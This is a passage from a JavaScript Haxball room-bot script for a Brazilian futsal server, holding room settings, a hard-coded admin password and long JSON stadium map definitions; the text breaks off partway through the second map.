// Stats: "Auth" : '["0-Games", "1-Wins", "2-Draws", "3-Losses", "4-Winrate", "5-Goals", "6-Assists", "7-GK", "8-CS", "9-CS%", "10-Role", "11-Nick"]'

export default function initBot(HBInit, { token, adminPassword: adminPasswordEnv } = {}) {
/* VARIABLES */

/* ROOM */

const roomName = "⚽⚽⚽ Futsal da Base";
const botName = "Carlo Ancelotti";
const maxPlayers = 12;
const roomPublic = true;
const geo = [{"lat":-9.7525,"lon":-36.66111,"code":"br"}, {"code": "FR", "lat": 46.2, "lon": 2.2}, {"code": "PL", "lat": 51.9, "lon": 19.1}, {"code": "GB", "lat": 55.3, "lon": -3.4}, {"code": "PT", "lat": 39.3, "lon": -8.2}];

const room = HBInit({ roomName: roomName, maxPlayers: maxPlayers, public: roomPublic, playerName: botName, geo: geo[0], token: token });

const scoreLimitClassic = 3;
const scoreLimitBig = 3;
const timeLimitClassic = 3;
const timeLimitBig = 3;

room.setTeamsLock(true);

var adminPassword = 444;
console.log("adminPassword : " + adminPassword);

/* STADIUM */

const playerRadius = 15;
var ballRadius = 10;
const triggerDistance = playerRadius + ballRadius + 0.01;
var aloneMap = '{"name": "SAKA Futsal 3v3 - HaxballPlanet.com","width": 620,"height": 270,"ballPhysics": "disc0","vertexes": [{"x": 0,"y": 270,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": 80,"bCoef": 0.15,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": -80,"bCoef": 0.15,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": -270,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": -550,"y": -80,"bCoef": 0.1,"cMask": ["ball"]},{"x": -590,"y": -80,"bCoef": 0.1,"cMask": ["ball"]},{"x": -590,"y": 80,"bCoef": 0.1,"cMask": ["ball"]},{"x": -550,"y": 80,"bCoef": 0.1,"cMask": ["ball"]},{"x": 550,"y": -80,"bCoef": 0.1,"cMask": ["ball"]},{"x": 590,"y": -80,"bCoef": 0.1,"cMask": ["ball"]},{"x": 590,"y": 80,"bCoef": 0.1,"cMask": ["ball"]},{"x": 550,"y": 80,"bCoef": 0.1,"cMask": ["ball"]},{"x": -550,"y": 80,"bCoef": 1.15,"cMask": ["ball"]},{"x": -550,"y": 241,"bCoef": 1.15,"cMask": ["ball"],"cGroup": ["ball"]},{"x": -550,"y": -80,"bCoef": 1.15,"cMask": ["ball"]},{"x": -550,"y": -241,"bCoef": 1.15,"cMask": ["ball"],"cGroup": ["ball"]},{"x": -551,"y": 240,"cMask": ["ball"],"cGroup": ["ball"]},{"x": 551,"y": 240,"cMask": ["ball"],"cGroup": ["ball"]},{"x": 550,"y": 80,"bCoef": 1.15,"cMask": ["ball"]},{"x": 550,"y": 241,"bCoef": 1.15,"cMask": ["ball"],"cGroup": ["ball"]},{"x": 550,"y": -241,"bCoef": 1.15,"cMask": ["ball"],"cGroup": ["ball"]},{"x": 550,"y": -80,"bCoef": 1.15,"cMask": ["ball"]},{"x": -551,"y": -240,"cMask": ["ball"],"cGroup": ["ball"]},{"x": 551,"y": -240,"cMask": ["ball"],"cGroup": ["ball"]},{"x": 0,"y": -238,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": -81.5,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": 81.5,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": 238,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": -557.5,"y": 80,"cMask": ["ball"]},{"x": -557.5,"y": -80,"cMask": ["ball"]},{"x": 557.5,"y": -80,"cMask": ["ball"]},{"x": 557.5,"y": 80,"cMask": ["ball"]},{"x": -550,"y": -80,"bCoef": 0.1,"cMask": []},{"x": -550,"y": 80,"bCoef": 0.1,"cMask": []},{"x": 550,"y": -80,"bCoef": 0.1,"cMask": []},{"x": 550,"y": 80,"bCoef": 0.1,"cMask": []},{"x": -548,"y": 200,"bCoef": 0.1,"cMask": []},{"x": -390,"y": 70,"bCoef": 0.1,"cMask": []},{"x": -548,"y": -200,"bCoef": 0.1,"cMask": []},{"x": -390,"y": -70,"bCoef": 0.1,"cMask": []},{"x": 548,"y": 200,"bCoef": 0.1,"cMask": []},{"x": 390,"y": 70,"bCoef": 0.1,"cMask": []},{"x": 548,"y": -200,"bCoef": 0.1,"cMask": []},{"x": 390,"y": -70,"bCoef": 0.1,"cMask": []},{"x": 390,"y": 70,"bCoef": 0.1,"cMask": []},{"x": 390,"y": -70,"bCoef": 0.1,"cMask": []},{"x": 0,"y": 1,"bCoef": 0.1,"cMask": []},{"x": 0,"y": -1,"bCoef": 0.1,"cMask": []},{"x": 0,"y": 3,"bCoef": 0.1,"cMask": []},{"x": 0,"y": -3,"bCoef": 0.1,"cMask": []},{"x": 0,"y": -2,"bCoef": 0.1,"cMask": []},{"x": 0,"y": 2,"bCoef": 0.1,"cMask": []},{"x": 0,"y": -3.5,"bCoef": 0.1,"cMask": []},{"x": 0,"y": 3.5,"bCoef": 0.1,"cMask": []},{"x": -548,"y": -78,"cMask": ["c0"],"cGroup": ["c0"]},{"x": 548,"y": -78,"cMask": ["c3"]},{"x": -548,"y": 78,"cMask": ["c3"]},{"x": 548,"y": 78,"cMask": ["c3"]},{"x": -550,"y": 80,"cMask": ["ball"]},{"x": 550,"y": 80,"cMask": ["ball"]},{"x": -550,"y": -80,"cMask": ["ball"]},{"x": 550,"y": -80,"cMask": ["ball"]},{"x": -550,"y": -80,"bCoef": 0.2,"cMask": ["ball"],"cGroup": ["ball"]},{"x": -550,"y": 80,"bCoef": 0.2,"cMask": ["ball"],"cGroup": ["ball"]},{"x": 550,"y": -80,"bCoef": 0.2,"cMask": ["ball"],"cGroup": ["ball"]},{"x": 550,"y": 80,"bCoef": 0.2,"cMask": ["ball"],"cGroup": ["ball"]},{"x": -550,"y": -80,"cMask": ["wall"]},{"x": -550,"y": 80,"cMask": ["wall"]},{"x": 550,"y": -80,"cMask": ["wall"]},{"x": 550,"y": 80,"cMask": ["wall"]},{"x": -548,"y": -80,"cMask": ["c3"],"cGroup": ["c3"]},{"x": -548,"y": 80,"cMask": ["c3"],"cGroup": ["c3"]},{"x": -552,"y": -80,"cMask": ["wall"]},{"x": -552,"y": 80,"cMask": ["wall"]},{"x": 548,"y": -80,"cMask": ["c3"],"cGroup": ["c3"]},{"x": 548,"y": 80,"cMask": ["c3"],"cGroup": ["c3"]},{"x": 552,"y": -80,"cMask": ["wall"]},{"x": 552,"y": 80,"cMask": ["wall"]},{"x": -548,"y": -239,"bCoef": 0.1,"cMask": ["c3"],"cGroup": ["c3"]},{"x": 548,"y": -239,"bCoef": 0.1,"cMask": ["c3"],"cGroup": ["c3"]},{"x": -548,"y": 239,"bCoef": 0.1,"cMask": ["c3"],"cGroup": ["c3"]},{"x": 548,"y": 239,"bCoef": 0.1,"cMask": ["c3"],"cGroup": ["c3"]},{"x": -549,"y": -238,"bCoef": 0.1,"cMask": ["c3"],"cGroup": ["c3"]},{"x": 549,"y": -238,"bCoef": 0.1,"cMask": ["c3"],"cGroup": ["c3"]},{"x": -549,"y": 238,"bCoef": 0.1,"cMask": ["c3"],"cGroup": ["c3"]},{"x": 549,"y": 238,"bCoef": 0.1,"cMask": ["c3"],"cGroup": ["c3"]}],"segments": [{"v0": 4,"v1": 5,"bias": 10,"bCoef": 0.1,"cMask": ["ball"],"color": "E56E56"},{"v0": 5,"v1": 6,"bias": 10,"bCoef": 0.1,"cMask": ["ball"],"color": "E56E56"},{"v0": 6,"v1": 7,"bias": 10,"bCoef": 0.1,"cMask": ["ball"],"color": "E56E56"},{"v0": 8,"v1": 9,"bias": -10,"bCoef": 0.1,"cMask": ["ball"],"color": "5689E5"},{"v0": 9,"v1": 10,"bias": -10,"bCoef": 0.1,"cMask": ["ball"],"color": "5689E5"},{"v0": 10,"v1": 11,"bias": -10,"bCoef": 0.1,"cMask": ["ball"],"color": "5689E5"},{"v0": 0,"v1": 1,"bCoef": 0.1,"vis": false,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"v0": 1,"v1": 2,"bCoef": 0.15,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["red","blue"],"cGroup": ["blueKO"],"color": "E56E56"},{"v0": 2,"v1": 1,"bCoef": 0.15,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["red","blue"],"cGroup": ["redKO"],"color": "5689E5"},{"v0": 2,"v1": 3,"bCoef": 0.1,"vis": false,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"v0": 12,"v1": 13,"bias": 10,"bCoef": 1.15,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 14,"v1": 15,"bias": -10,"bCoef": 1.15,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 16,"v1": 17,"bias": 10,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 18,"v1": 19,"bias": -10,"bCoef": 1.15,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 20,"v1": 21,"bias": -10,"bCoef": 1.15,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 22,"v1": 23,"bias": -10,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 24,"v1": 25,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 26,"v1": 27,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 37,"v1": 36,"bCoef": 0.1,"curve": 89.99999999999999,"curveF": 1.0000000000000002,"cMask": [],"color": "FFFFFF"},{"v0": 38,"v1": 39,"bCoef": 0.1,"curve": 89.99999999999999,"curveF": 1.0000000000000002,"cMask": [],"color": "FFFFFF"},{"v0": 37,"v1": 39,"bCoef": 0.1,"cMask": [],"color": "FFFFFF"},{"v0": 40,"v1": 41,"bCoef": 0.1,"curve": 89.99999999999999,"curveF": 1.0000000000000002,"cMask": [],"color": "FFFFFF"},{"v0": 43,"v1": 42,"bCoef": 0.1,"curve": 89.99999999999999,"curveF": 1.0000000000000002,"cMask": [],"color": "FFFFFF"},{"v0": 44,"v1": 45,"bCoef": 0.1,"cMask": [],"color": "FFFFFF"},{"v0": 47,"v1": 46,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": [],"color": "FFFFFF"},{"v0": 46,"v1": 47,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": [],"color": "FFFFFF"},{"v0": 49,"v1": 48,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": [],"color": "FFFFFF"},{"v0": 48,"v1": 49,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": [],"color": "FFFFFF"},{"v0": 51,"v1": 50,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": [],"color": "FFFFFF"},{"v0": 50,"v1": 51,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": [],"color": "FFFFFF"},{"v0": 53,"v1": 52,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": [],"color": "FFFFFF"},{"v0": 52,"v1": 53,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": [],"color": "FFFFFF"},{"v0": 66,"v1": 67,"cMask": ["wall"],"color": "FF6666"},{"v0": 68,"v1": 69,"cMask": ["wall"],"color": "6666FF"},{"v0": 70,"v1": 71,"cMask": ["wall"],"color": "4D4D4D"},{"v0": 72,"v1": 73,"cMask": ["wall"],"color": "4D4D4D"},{"v0": 74,"v1": 75,"cMask": ["wall"],"color": "4D4D4D"},{"v0": 76,"v1": 77,"cMask": ["wall"],"color": "4D4D4D"},{"v0": 70,"v1": 78,"bCoef": 0.1,"cMask": ["c3"],"cGroup": ["c3"],"color": "FFFFFF"},{"v0": 74,"v1": 79,"bCoef": 0.1,"cMask": ["c3"],"cGroup": ["c3"],"color": "FFFFFF"},{"v0": 71,"v1": 80,"bCoef": 0.1,"cMask": ["c3"],"cGroup": ["c3"],"color": "FFFFFF"},{"v0": 75,"v1": 81,"bCoef": 0.1,"cMask": ["c3"],"cGroup": ["c3"],"color": "FFFFFF"},{"v0": 83,"v1": 82,"cMask": ["c3"],"cGroup": ["c3"],"color": "FFFFFF"},{"v0": 85,"v1": 84,"cMask": ["c3"],"cGroup": ["c3"],"color": "FFFFFF"}],"planes": [{"normal": [0,1],"dist": -270,"bCoef": 0.1},{"normal": [0,-1],"dist": -270,"bCoef": 0.1},{"normal": [1,0],"dist": -620,"bCoef": 0.1},{"normal": [-1,0],"dist": -620,"bCoef": 0.1},{"normal": [1,0],"dist": -620,"bCoef": 0.1,"cMask": ["ball"]},{"normal": [-1,0],"dist": -620,"bCoef": 0.1,"cMask": ["ball"]}],"goals": [{"p0": [-555.8,-80],"p1": [-555.8,80],"team": "red"},{"p0": [555.8,80],"p1": [555.8,-80],"team": "blue"}],"playerPhysics": {"bCoef": 0,"acceleration": 0.11,"kickingAcceleration": 0.083,"kickStrength": 4.545},"discs": [{"radius": 5.8,"bCoef": 0.474,"invMass": 1.5,"color": "FFC338","cGroup": ["ball","kick","score"]},{"pos": [-550,80],"radius": 5,"invMass": 0,"color": "E56E56"},{"pos": [-550,-80],"radius": 5,"invMass": 0,"color": "E56E56"},{"pos": [550,80],"radius": 5,"invMass": 0,"color": "5689E5"},{"pos": [550,-80],"radius": 5,"invMass": 0,"color": "5689E5"}],"spawnDistance": 350,"bg": {"width": 550,"height": 240,"kickOffRadius": 80,"color": "4D4D4D"}}';
var classicMap = '{"name": "Futsal x3 ; By Bazinga! - HaxballPlanet.com","width": 620,"height": 270,"bg": {"type": "hockey","width": 550,"height": 240,"kickOffRadius": 80},"vertexes": [{"x": -550,"y": 240,"cMask": ["ball"]},{"x": -550,"y": 80,"cMask": ["ball"]},{"x": -550,"y": -80,"cMask": ["ball"]},{"x": -550,"y": -240,"cMask": ["ball"]},{"x": 550,"y": 240,"cMask": ["ball"]},{"x": 550,"y": 80,"cMask": ["ball"]},{"x": 550,"y": -80,"cMask": ["ball"]},{"x": 550,"y": -240,"cMask": ["ball"]},{"x": 0,"y": 240,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": 80,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": -80,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": -240,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": -551,"y": -80,"bCoef": 0.1,"cMask": ["red","blue","ball"]},{"x": -590,"y": -80,"bCoef": 0.1,"cMask": ["red","blue","ball"]},{"x": -590,"y": 80,"bCoef": 0.1,"cMask": ["red","blue","ball"]},{"x": -551,"y": 80,"bCoef": 0.1,"cMask": ["red","blue","ball"]},{"x": 550,"y": -80,"bCoef": 0.1,"cMask": ["red","blue","ball"]},{"x": 590,"y": -80,"bCoef": 0.1,"cMask": ["red","blue","ball"]},{"x": 590,"y": 80,"bCoef": 0.1,"cMask": ["red","blue","ball"]},{"x": 550,"y": 80,"bCoef": 0.1,"cMask": ["red","blue","ball"]},{"x": -550,"y": 240,"bCoef": 0.1,"cMask": ["ball"]},{"x": 550,"y": 240,"bCoef": 0.1,"cMask": ["ball"]},{"x": -550,"y": -240,"bCoef": 0.1,"cMask": ["ball"]},{"x": 550,"y": -240,"bCoef": 0.1,"cMask": ["ball"]},{"x": -550,"y": -80,"bCoef": 0.1,"cMask": ["ball"]},{"x": -550,"y": -240,"bCoef": 0.1,"cMask": ["ball"]},{"x": -550,"y": 240,"bCoef": 0.1,"cMask": ["ball"]},{"x": -550,"y": 80,"bCoef": 0.1,"cMask": ["ball"]},{"x": 550,"y": 240,"bCoef": 0.1,"cMask": ["ball"]},{"x": 550,"y": 80,"bCoef": 0.1,"cMask": ["ball"]},{"x": 550,"y": -80,"bCoef": 0.1,"cMask": ["ball"]},{"x": 550,"y": -240,"bCoef": 0.1,"cMask": ["ball"]},{"x": -550,"y": 200,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -390,"y": 71,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -550,"y": -200,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -392,"y": -71,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -392,"y": -71,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -390,"y": 71,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -550,"y": 79,"bCoef": 0.1,"cMask": ["blue"]},{"x": -550,"y": -81,"bCoef": 0.1,"cMask": ["blue"]},{"x": 550,"y": 200,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 390,"y": 71,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 550,"y": -200,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 392,"y": -71,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 392,"y": -71,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 390,"y": 71,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 550,"y": 81,"bCoef": 0.1,"cMask": ["red"]},{"x": 550,"y": -79,"bCoef": 0.1,"cMask": ["red"]},{"x": -550,"y": 226,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -536,"y": 239,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -536,"y": -239,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -550,"y": -226,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": 536,"y": -239,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 550,"y": -226,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 550,"y": 226,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 536,"y": 239,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": -374.3333358764648,"y": -1.5451431274414062,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -374.3333358764648,"y": -0.5451431274414062,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -374.3333358764648,"y": -1.5451431274414062,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -374.3333358764648,"y": -0.5451431274414062,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -377.3333358764648,"y": -5.545143127441406,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -373.3333358764648,"y": 0.45485687255859375,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -377.3333358764648,"y": -5.545143127441406,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -373.3333358764648,"y": 0.45485687255859375,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -376.3333358764648,"y": -4.545143127441406,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -375.3333358764648,"y": -2.5451431274414062,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -376.3333358764648,"y": -4.545143127441406,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -375.3333358764648,"y": -2.5451431274414062,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -375.3333358764648,"y": -3.5451431274414062,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -375.3333358764648,"y": -2.5451431274414062,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -375.3333358764648,"y": -3.5451431274414062,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -375.3333358764648,"y": -2.5451431274414062,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -276.33333587646484,"y": -2.5451431274414062,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -276.33333587646484,"y": -1.5451431274414062,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -276.33333587646484,"y": -2.5451431274414062,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -276.33333587646484,"y": -1.5451431274414062,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -279.33333587646484,"y": -6.545143127441406,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -275.33333587646484,"y": -0.5451431274414062,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -279.33333587646484,"y": -6.545143127441406,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -275.33333587646484,"y": -0.5451431274414062,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -278.33333587646484,"y": -5.545143127441406,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -277.33333587646484,"y": -3.5451431274414062,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -278.33333587646484,"y": -5.545143127441406,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -277.33333587646484,"y": -3.5451431274414062,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -277.33333587646484,"y": -4.545143127441406,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -277.33333587646484,"y": -3.5451431274414062,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -277.33333587646484,"y": -4.545143127441406,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -277.33333587646484,"y": -3.5451431274414062,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": 278.66666412353516,"y": -2.5451431274414062,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 278.66666412353516,"y": -1.5451431274414062,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 278.66666412353516,"y": -2.5451431274414062,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 278.66666412353516,"y": -1.5451431274414062,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 275.66666412353516,"y": -6.545143127441406,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 279.66666412353516,"y": -0.5451431274414062,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 275.66666412353516,"y": -6.545143127441406,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 279.66666412353516,"y": -0.5451431274414062,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 276.66666412353516,"y": -5.545143127441406,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 277.66666412353516,"y": -3.5451431274414062,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 276.66666412353516,"y": -5.545143127441406,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 277.66666412353516,"y": -3.5451431274414062,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 277.66666412353516,"y": -4.545143127441406,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 277.66666412353516,"y": -3.5451431274414062,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 277.66666412353516,"y": -4.545143127441406,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 277.66666412353516,"y": -3.5451431274414062,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 374.6666641235352,"y": -2.5451431274414062,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 374.6666641235352,"y": -1.5451431274414062,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 374.6666641235352,"y": -2.5451431274414062,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 374.6666641235352,"y": -1.5451431274414062,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 371.6666641235352,"y": -6.545143127441406,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 375.6666641235352,"y": -0.5451431274414062,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 371.6666641235352,"y": -6.545143127441406,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 375.6666641235352,"y": -0.5451431274414062,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 372.6666641235352,"y": -5.545143127441406,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 373.6666641235352,"y": -3.5451431274414062,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 372.6666641235352,"y": -5.545143127441406,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 373.6666641235352,"y": -3.5451431274414062,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 373.6666641235352,"y": -4.545143127441406,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 373.6666641235352,"y": -3.5451431274414062,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 373.6666641235352,"y": -4.545143127441406,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 373.6666641235352,"y": -3.5451431274414062,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": -80,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["blueKO"]},{"x": 0,"y": 80,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["blueKO"]},{"x": -381,"y": 256,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -381,"y": 240,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -381,"y": -239.77778244018555,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -381,"y": -256,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": 383,"y": 256,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 383,"y": 240,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 383,"y": -239.77778244018555,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 383,"y": -255.77778244018555,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": -575,"y": 123,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -556,"y": 123,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -575,"y": -123,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -556,"y": -123,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": 556,"y": 123,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": 575,"y": 123,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": 556,"y": -123,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": 575,"y": -123,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -240,"y": 256,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -240,"y": 224,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -120,"y": 256,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -120,"y": 224,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": 120,"y": 256,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 120,"y": 224,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 